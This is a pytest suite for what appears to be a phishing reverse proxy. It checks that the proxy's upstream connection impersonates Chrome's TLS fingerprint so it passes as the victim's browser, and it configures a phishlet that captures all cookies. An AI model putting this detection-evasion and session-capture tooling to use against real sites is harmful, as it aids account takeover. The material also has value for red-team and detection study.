"""The upstream leg's TLS fingerprint, verified by capturing our own ClientHello.

The proxy is only convincing if the client talking to the upstream looks like the
browser the victim is using. This suite starts a TLS listener that records the
ClientHello, then asks `core.tls_fp` (the project's own JA3 parser, normally used
to fingerprint VISITORS) to fingerprint OUR outbound request - so the claim "the
upstream sees Chrome" is an observation, not a sentence in a doc.

`openssl` is needed to make the self-signed certificate; the fingerprint tests skip
with a reason without it. The fallback tests never skip.
"""
import contextlib
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import (  # noqa: E402
    tls_fp,
    transport,
)

pytestmark = pytest.mark.integration


def _cert():
    """A throwaway self-signed cert, or None when openssl is missing."""
    if not shutil_which("openssl"):
        return None
    d = tempfile.mkdtemp(prefix="bh_tls_")
    crt, key = os.path.join(d, "c.pem"), os.path.join(d, "k.pem")
    p = subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
                        "-keyout", key, "-out", crt, "-days", "1", "-subj", "/CN=127.0.0.1"],
                       capture_output=True, text=True, timeout=90)
    if p.returncode != 0 or not os.path.isfile(crt):
        return None
    return crt, key


def shutil_which(name):
    import shutil
    return shutil.which(name)


class HelloCatcher:
    """A TCP listener that records the TLS ClientHello of every connection."""

    def __init__(self):
        self.hellos = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(8)
        self.port = self.sock.getsockname()[1]
        self._stop = False
        self.thread = threading.Thread(target=self._serve, daemon=True)
        self.thread.start()

    def _serve(self):
        while not self._stop:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            try:
                conn.settimeout(3)
                head = conn.recv(5)
                if len(head) < 5 or head[0] != 0x16:
                    conn.close()
                    continue
                need = 5 + ((head[3] << 8) | head[4])
                data = head
                while len(data) < need:
                    chunk = conn.recv(need - len(data))
                    if not chunk:
                        break
                    data += chunk
                self.hellos.append(data)
            except Exception:
                pass
            finally:
                with contextlib.suppress(Exception):
                    conn.close()

    def ja3(self, index=0):
        with_hello = [h for h in self.hellos if tls_fp.parse_client_hello(h)]
        if len(with_hello) <= index:
            return {}
        return tls_fp.ja3_full(tls_fp.parse_client_hello(with_hello[index]))

    def close(self):
        self._stop = True
        with contextlib.suppress(Exception):
            self.sock.close()


@pytest.fixture()
def catcher():
    c = HelloCatcher()
    yield c
    c.close()


# ====================================================== the fingerprint itself ==
@pytest.mark.skipif(not shutil_which("openssl"), reason="openssl not available")
class TestFingerprint:

    def test_impersonation_changes_the_hello_we_send(self, catcher):
        """The whole point: plain Python TLS vs a browser's ClientHello."""
        if not transport.available():
            pytest.skip("curl_cffi is not installed")
        url = f"https://127.0.0.1:{catcher.port}/"
        for imp in ("", "chrome"):
            # the handshake cannot finish (nothing answers it); the hello is captured
            with contextlib.suppress(Exception):
                transport.request("GET", url, timeout=5, verify=False, impersonate=imp)
        plain, chrome = catcher.ja3(0), catcher.ja3(1)
        assert plain.get("ja3"), f"no hello captured: {catcher.hellos}"
        assert chrome.get("ja3"), f"no impersonated hello captured: {catcher.hellos}"
        assert plain["ja3"] != chrome["ja3"], "the impersonation did not reach the wire"
        # TLS 1.3 suites first, GREASE included: a real Chrome hello
        assert "4865-4866-4867" in chrome["ja3_string"], chrome["ja3_string"][:120]
        assert chrome["ja3"] != chrome["ja3_raw"], "Chrome sends GREASE; this did not"

    def test_the_impersonated_hello_carries_chromes_cipher_and_extension_sets(self, catcher):
        """curl_cffi permutes the extension ORDER per request (as Chrome does), so
        the JA3 hash differs run to run by design. What must match the reference is
        the cipher list, the curve list and the SET of extensions."""
        if not transport.available():
            pytest.skip("curl_cffi is not installed")
        from curl_cffi import requests as curl_requests
        url = f"https://127.0.0.1:{catcher.port}/"
        with contextlib.suppress(Exception):
            transport.request("GET", url, timeout=5, verify=False, impersonate="chrome")
        with contextlib.suppress(Exception):
            curl_requests.get(url, impersonate="chrome", verify=False, timeout=5)
        ours, reference = catcher.ja3(0), catcher.ja3(1)
        assert ours.get("ja3") and reference.get("ja3"), catcher.hellos

        def parts(f):
            ciphers, exts, curves = f["ja3_string"].split(",")[1:4]
            return set(ciphers.split("-")), set(exts.split("-")), set(curves.split("-"))

        oc, oe, ocur = parts(ours)
        rc, re_, rcur = parts(reference)
        assert oc == rc, (sorted(oc), sorted(rc))
        assert ocur == rcur, (ocur, rcur)
        assert oe == re_, (sorted(oe), sorted(re_))

    def test_the_extension_order_is_permuted_per_request(self, catcher):
        """Two impersonated requests must not share a JA3: a fixed extension order
        is itself a fingerprint, and Chrome's is not fixed."""
        if not transport.available():
            pytest.skip("curl_cffi is not installed")
        url = f"https://127.0.0.1:{catcher.port}/"
        for _ in range(4):
            with contextlib.suppress(Exception):
                transport.request("GET", url, timeout=5, verify=False,
                                  impersonate="chrome")
        hashes = {catcher.ja3(i).get("ja3") for i in range(4)}
        hashes.discard("")
        assert len(hashes) >= 3, f"the hello is identical every time: {hashes}"

    def test_the_engine_uses_it_for_the_upstream_leg(self, catcher):
        """Not just the transport module: the PROXY's fetch carries the profile."""
        if not transport.available():
            pytest.skip("curl_cffi is not installed")
        from core.phishlet import Phishlet, ProxyHost
        from core.proxy import ProxyEngine
        ph = Phishlet(capture_cookies=["*"], inject_paths=[".*"], verify_tls=False)
        ph.proxy_hosts = [ProxyHost(domain="127.0.0.1", orig_sub="", phish_sub="",
                                    scheme="https", port=catcher.port,
                                    is_landing=True)]
        engine = ProxyEngine(ph, db=None, geo_provider="off", logger=lambda *a: None,
                             impersonate="chrome")
        sess = engine.session("a" * 32, ip="127.0.0.1", ua="Mozilla/5.0")
        with contextlib.suppress(Exception):
            engine.fetch(sess, "GET", "/")
        got = catcher.ja3(0)
        assert got.get("ja3"), "the proxy never reached the TLS listener"
        assert "4865-4866-4867" in got["ja3_string"], got["ja3_string"][:120]


# ==================================================== fallback + guard rails ==
class TestFallback:

    def test_without_curl_cffi_the_plain_engine_is_used(self, monkeypatch):
        """The impersonation is optional: without it every request still works."""
        import http.server
        import socketserver

        class H(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Length", "2")
                self.end_headers()
                self.wfile.write(b"ok")

        srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), H)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        time.sleep(0.2)
        try:
            monkeypatch.setattr(transport, "_curl_cffi", lambda: None)
            assert transport.available() is False
            assert transport.profile_ok("chrome") is False
            r = transport.request("GET", f"http://127.0.0.1:{port}/", timeout=5,
                                  impersonate="chrome")
            assert r.status_code == 200
            assert r.engine == "requests", "must fall back, not fail"
        finally:
            srv.shutdown()

    def test_an_unknown_profile_is_a_refusal(self):
        if not transport.available():
            pytest.skip("curl_cffi is not installed")
        with pytest.raises(ValueError):
            transport.request("GET", "http://127.0.0.1:9/", timeout=2,
                              impersonate="netscape4")

    def test_profiles_are_validated_against_the_build(self):
        for name in ("chrome", "chrome131", "firefox135", "safari180"):
            if not transport.profile_ok(name):
                pytest.skip(f"{name} is not in this curl_cffi build")
        assert transport.profile_ok("") is True
        assert transport.profile_ok("netscape4") is False


# ============================================================ cookie plumbing ==
class TestCookies:

    def test_the_jar_decides_which_cookies_go(self):
        import http.cookiejar
        jar = http.cookiejar.CookieJar()
        for name, domain in (("for_target", "target.test"), ("for_other", "other.test")):
            jar.set_cookie(http.cookiejar.Cookie(
                version=0, name=name, value="v", port=None, port_specified=False,
                domain=domain, domain_specified=True, domain_initial_dot=False,
                path="/", path_specified=True, secure=False, expires=None,
                discard=False, comment=None, comment_url=None, rest={}))
        header = transport.cookie_header(jar, "https://target.test/login")
        assert "for_target=v" in header
        assert "for_other" not in header, header

    def test_duplicate_set_cookie_headers_all_come_back(self):
        import http.server
        import socketserver

        class H(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Set-Cookie", "a=1; Path=/")
                self.send_header("Set-Cookie", "b=2; Path=/")
                self.send_header("Content-Length", "2")
                self.end_headers()
                self.wfile.write(b"ok")

        srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), H)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        time.sleep(0.2)
        try:
            r = transport.request("GET", f"http://127.0.0.1:{port}/", timeout=5)
            vals = transport.set_cookies(r)
            assert len(vals) == 2, vals
            assert any(v.startswith("a=1") for v in vals)
            assert any(v.startswith("b=2") for v in vals)
            assert [k.lower() for k, _ in r.pairs].count("set-cookie") == 2
        finally:
            srv.shutdown()

    def test_response_headers_are_case_insensitive(self):
        import http.server
        import socketserver

        class H(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def do_GET(self):
                body = b"<html>x</html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), H)
        port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        time.sleep(0.2)
        try:
            r = transport.request("GET", f"http://127.0.0.1:{port}/", timeout=5)
            assert "text/html" in r.header("content-type")
            assert "text/html" in r.header("Content-Type")
            assert "Content-Type" in r.headers
            assert "content-type" in r.headers
        finally:
            srv.shutdown()


# ============================ the upstream leg is browser-shaped by default ===
class TestEffectiveProfile:
    """A plain Python TLS client is the loudest signal on the wire, so the browser
    profile is the default and the opt-out is explicit."""

    def test_it_defaults_to_chrome_when_curl_cffi_is_present(self):
        assert transport.effective_profile("", have=True) == "chrome"

    def test_without_curl_cffi_there_is_nothing_to_impersonate(self):
        assert transport.effective_profile("", have=False) == ""

    def test_an_explicit_choice_always_wins(self):
        assert transport.effective_profile("firefox135", have=True) == "firefox135"
        assert transport.effective_profile("firefox135", have=False) == "firefox135"

    def test_the_opt_out_beats_everything(self):
        assert transport.effective_profile("", opt_out=True, have=True) == ""
        assert transport.effective_profile("chrome", opt_out=True, have=True) == ""

    def test_whitespace_is_not_a_choice(self):
        assert transport.effective_profile("   ", have=True) == "chrome"

    def test_the_installed_check_is_the_default_when_nothing_is_passed(self):
        """The real call site, with no override: it must probe the environment
        rather than raise (naming the parameter `available` shadowed the function)."""
        out = transport.effective_profile()
        assert out in ("", "chrome")
        assert out == ("chrome" if transport.available() else "")
